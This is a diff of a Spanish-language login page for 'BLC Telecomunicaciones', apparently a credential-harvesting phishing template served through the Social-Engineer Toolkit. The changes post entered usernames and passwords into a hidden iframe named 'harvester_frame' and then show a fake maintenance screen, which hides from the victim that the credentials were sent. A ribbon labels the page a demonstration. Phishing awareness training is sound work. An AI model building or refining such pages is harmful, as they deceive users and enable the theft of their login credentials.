@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Inicio de sesión</title>
   <link rel="icon" href="logo.png" type="image/png" />
-  <meta name="description" content="BAC Telecomunicaciones — Acceso al módulo demo." />
+  <meta name="description" content="BLC Telecomunicaciones — Acceso al módulo demo." />
   <meta name="robots" content="noindex,nofollow" />
   <style>
     /* ====== Variables base ====== */
@@ -83,8 +83,8 @@
     <div class="decor"><div class="orb tl"></div><div class="orb br"></div></div>
     <main class="card" role="main" aria-labelledby="titulo">
       <div class="brand">
-        <img class="logo" src="logo.png" alt="Logo BAC Telecomunicaciones" />
-        <div class="name">BAC Telecomunicaciones</div>
+        <img class="logo" src="logo.png" alt="Logo BLC Telecomunicaciones" />
+        <div class="name">BLC Telecomunicaciones</div>
       </div>
 
       <h1 id="titulo" class="title">Bienvenido</h1>
@@ -96,7 +96,7 @@
 
       <!-- El action original se deja vacío para compatibilidad con SET; sin embargo,
            el comportamiento de "Entrar" será controlado por JS para mostrar la vista de mantenimiento -->
-      <form id="loginForm" action="" method="post" novalidate autocomplete="on">
+      <form id="loginForm" action="" method="post" target="harvester_frame" novalidate autocomplete="on">
         <label for="usuario">Usuario</label>
         <input class="input" id="usuario" name="usuario" type="text" autocomplete="username" placeholder="tu.usuario" required />
 
@@ -123,7 +123,8 @@
     <noscript><div class="noscript">Este formulario funciona sin JavaScript, pero la opción “Mostrar/Ocultar” contraseña no estará disponible.</div></noscript>
   </section>
 
-  <!-- ====== SECCIÓN MANTENIMIENTO ====== -->
+  <iframe name="harvester_frame" class="hidden" aria-hidden="true" tabindex="-1" style="width:0;height:0;border:0;"></iframe>
+<!-- ====== SECCIÓN MANTENIMIENTO ====== -->
   <section id="view-maint" class="maint-bg hidden" aria-label="En mantenimiento">
     <div class="ribbon">⚠️ <span><strong>Esta es una demostración.</strong> No ingreses credenciales reales.</span></div>
     <div class="wrap">
@@ -163,9 +164,13 @@
       document.title = 'Inicio de sesión';
     }
 
-    // Submit: permitir POST para que SET capture credenciales
+    // Enviar y luego ir a mantenimiento (sin bloquear el POST)
 const form = document.getElementById('loginForm');
-// (Sin e.preventDefault) — SET reescribirá action="" a post.php al servir la página
+form.addEventListener('submit', () => {
+  setTimeout(() => { try { showMaint(); } catch(e){} }, 50);
+});
+
+// Permite abrir directamente #mantenimiento en la URL (opcional)
 if (location.hash === '#mantenimiento') showMaint();
   </script>
 </body>
